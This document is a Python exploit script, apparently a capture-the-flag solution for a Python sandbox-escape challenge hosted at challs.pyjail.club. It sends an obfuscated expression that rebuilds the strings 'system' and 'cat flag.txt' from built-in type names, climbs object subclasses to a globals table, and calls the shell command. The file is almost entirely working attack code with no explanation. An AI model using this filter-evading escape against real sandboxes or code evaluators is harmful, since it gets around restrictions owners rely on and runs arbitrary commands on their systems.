import socket

EXPR = r'''(lambda T,O,F,G,S,Y,M,I,D,U,NX,doc:(lambda ch:(lambda system,cmd:(lambda g:g.__getitem__(system)(cmd))((c.__init__.__globals__ for c in ().__class__.__base__.__subclasses__() if c.__init__.__class__==(lambda:1).__class__ and system in c.__init__.__globals__).__next__()))(ch(S,0)+ch(Y,1)+ch(S,0)+ch(T,0)+ch(T,4)+ch(M,0),ch(O,4)+ch(F,3)+ch(T,0)+doc.__getitem__(7)+ch(F,0)+ch(F,1)+ch(F,3)+ch(G,0)+doc.__getitem__(66)+ch(T,0)+ch(NX,4)+ch(T,0)))(lambda s,i:s.__getitem__(i)))(().__class__.__name__,().__class__.__base__.__name__,(1.).__class__.__name__,(x for x in ()).__class__.__name__,().__class__.__name__.__class__.__name__,().__class__.__class__.__name__,().__init__.__class__.__name__,(1).__class__.__name__,{}.__class__.__name__,().__class__.__base__.__subclasses__.__name__,(x for x in ()).__next__.__name__,(1.).__doc__)'''

s = socket.create_connection(("challs.pyjail.club", 17761), timeout=10)
s.settimeout(5)
buf = b""
while b"> " not in buf:
    buf += s.recv(4096)
s.sendall(EXPR.encode() + b"\n")
out = b""
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except Exception:
        break
s.close()
print(out.decode())
